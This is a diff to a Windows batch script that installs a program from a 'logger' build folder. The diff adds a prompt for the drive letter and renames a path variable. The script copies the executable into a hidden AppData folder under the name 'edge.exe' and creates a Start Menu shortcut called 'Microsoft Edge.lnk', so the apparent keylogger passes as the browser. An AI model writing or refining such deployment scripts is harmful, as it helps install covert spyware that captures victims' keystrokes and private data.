@@ -2,11 +2,11 @@
 setlocal
 color 3
 
+echo Type .exe file disk letter (e.g. Y):
+set /p DISK_LETTER=
+
 set "USER_PROFILE=%USERPROFILE%"
 
-set "DISK_LETTER=Y"
-
-:: Setting paths
 set "EXE_PATH=%DISK_LETTER%:\logger\builds\version.exe"
 set "EXE_DEST=%USERPROFILE%\AppData\Roaming\Browsers\edge.exe"
 set "SHORTCUT_PATH=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Microsoft Edge.lnk"
@@ -19,9 +19,9 @@ if not exist "%EXE_PATH%" (
 )
 
 :: Create the Browsers folder if it doesn't exist
-if not exist "%USERPROFILE%\AppData\Roaming\Browsers" (
+if not exist "%USER_PROFILE%\AppData\Roaming\Browsers" (
     echo [INFO] Creating Browsers folder...
-    mkdir "%USERPROFILE%\AppData\Roaming\Browsers"
+    mkdir "%USER_PROFILE%\AppData\Roaming\Browsers"
 )
 
 :: If the destination file already exists, delete it before copying
@@ -40,7 +40,7 @@ if not exist "%EXE_DEST%" (
 )
 
 :: Set the file as hidden
-attrib +h "%USERPROFILE%\AppData\Roaming\Browsers"
+attrib +h "%USER_PROFILE%\AppData\Roaming\Browsers"
 
 :: If the shortcut already exists, delete it before creating a new one
 if exist "%SHORTCUT_PATH%" (
@@ -61,8 +61,7 @@ if not exist "%SHORTCUT_PATH%" (
 
 :: Open the folder
 echo [INFO] Opening Explorer...
-explorer "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs"
-explorer "%USERPROFILE%\AppData\Roaming\Browsers"
+explorer "%USER_PROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs"
+explorer "%USER_PROFILE%\AppData\Roaming\Browsers"
 
-echo [SUCCESS] Done!
-pause
+echo [SUCCESS] Copying files completed!
